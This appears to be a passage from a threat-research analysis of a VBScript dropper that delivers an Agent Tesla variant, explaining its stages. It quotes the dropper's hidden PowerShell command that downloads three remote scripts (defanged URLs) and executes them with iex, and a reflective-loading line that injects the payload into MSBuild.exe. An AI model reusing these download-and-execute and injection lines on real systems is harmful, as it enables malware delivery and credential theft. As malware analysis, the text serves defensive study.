
This content contains a piece of VBScript code that performs the three tasks shown below: Downloads PowerShell files to deliver the new Agent Tesla variant It calls the VBScript method MicrosoftWINdows.
Run() with the following parameter.
\"cmd /c start /min
PowerShell -ex Bypass -nOp -w 1 ;i'E'x(iwr('hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-1.txt') -useB);i'E'x(iwr
(' hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-2.txt') -useB);i'E'x(iwr(' hxxps://ia801500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-3.txt') -useB)\
" It then runs PowerShell to execute three PowerShell files downloaded from three URLs.
There are two EXE files stored in two huge arrays inside each downloaded PowerShell file.
The two EXE files are a loader of Agent Tesla and a new variant of Agent Tesla.
Below is a segment of code extracted from “27-1.txt” as an example to explain how it loads Agent Tesla.
[Reflection.
Assembly]::Load($Cli555).GetType('WpfControlLibrary1.LOGO').GetMethod('Run').Invoke($null,[object[]] ('C:\\Windows\\Microsoft.
NET\\Framework\\v4.0.30319\\MSBuild.exe',$Cli444)); As you can see, it loads the loader from the array $Cli555, which has a function called “WpfControlLibrary1.LOGO.Run()” requiring two parameters.
It runs a normal EXE file (“MSBuild.exe”), then deploys the new Agent Tesla variant stored in the huge array $Cli444 into it and executes.